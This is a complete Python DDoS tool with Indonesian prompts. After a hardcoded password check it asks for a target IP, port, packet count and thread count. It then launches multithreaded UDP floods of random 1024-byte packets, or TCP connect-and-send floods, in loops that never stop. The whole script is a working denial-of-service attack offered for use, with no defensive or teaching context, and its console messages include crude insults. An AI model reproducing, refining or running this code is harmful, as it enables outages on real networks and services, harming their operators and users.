#!/usr/bin/env python3
#Kagak Usah Rename BY By Tai Anjing 
#TOOLS DDOS
import random
import socket
import threading
import time
import os

os.system("clear")
#login tools
password ="DDOS"

for i in range(3):
	pwd = input("[•] Password Nya Apa??... : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] TUNGGU BERAPA DETIK!!! ")
		break
	else:
		time.sleep(5)
		print("[×] Salah Password Jancok!!! ")
		continue
time.sleep(5)
print("{√} Done Use Password \u001b[33mDdos")
time.sleep(5)

os.system("clear")
print("DDoS Tools[Beta Version]")
print("Bismilah Tembus")
ip = str(input(" Ip: "))
port = int(input(" Port: "))
choice = str(input(" Gas?(y/n): "))
times = int(input(" Packets: "))
threads = int(input(" Threads: "))
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" | DDOS!!! |")
    except:
      print("[!] | DDOS!!! |")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" Reza TOOLS DDOS!")
    except:
      s.close()
      print("[*] Down")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()